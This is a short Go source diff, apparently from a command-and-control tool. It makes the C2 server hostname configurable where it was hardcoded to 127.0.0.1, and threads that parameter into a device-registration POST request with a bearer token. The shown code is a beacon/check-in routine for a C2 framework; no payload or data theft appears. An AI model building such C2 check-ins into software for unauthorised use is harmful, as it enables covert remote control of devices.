@@ -66,9 +66,9 @@ func CheckForInternet() {
 /*
 	Returns URL
 */
-func getURLForC2Server() string {
+func getURLForC2Server(hostname string) string {
 
-	c2_host := "127.0.0.1"
+	c2_host := hostname
 	url := "http://" + c2_host + ":8000/api/devices/addDevice"
 
 	timeout := 1 * time.Second
@@ -77,7 +77,7 @@ func getURLForC2Server() string {
 		log.Logger.Error().Msgf("[+]\tSite unreachable, [ERROR] -", err)
 		log.Logger.Fatal()
 	}
-	log.Logger.Info().Msgf("[+]\tC2 is Alive -> %s", conn.LocalAddr().String())
+	log.Logger.Info().Msgf("[+]\tC2 is alive on -> %s", conn.LocalAddr().String())
 
 	return url
 }
@@ -87,7 +87,7 @@ func getURLForC2Server() string {
 	Makes a post resquest to API
 	Receives JSON data with DeviceID for RPI
 */
-func Api_call_addDevice() uint32 {
+func Api_call_addDevice(hostname string) uint32 {
 
 	ipAddr := get_ip().String()
 	// Create a Bearer string by appending string access token
@@ -100,7 +100,7 @@ func Api_call_addDevice() uint32 {
 	responseBody := bytes.NewBuffer(postBody)
 
 	// Create a new request using http
-	req, err := http.NewRequest("POST", getURLForC2Server(), responseBody)
+	req, err := http.NewRequest("POST", getURLForC2Server(hostname), responseBody)
 	if err != nil {
 		log.Logger.Error().Msgf("[X]\tError on response.\n[ERROR] -", err)
 
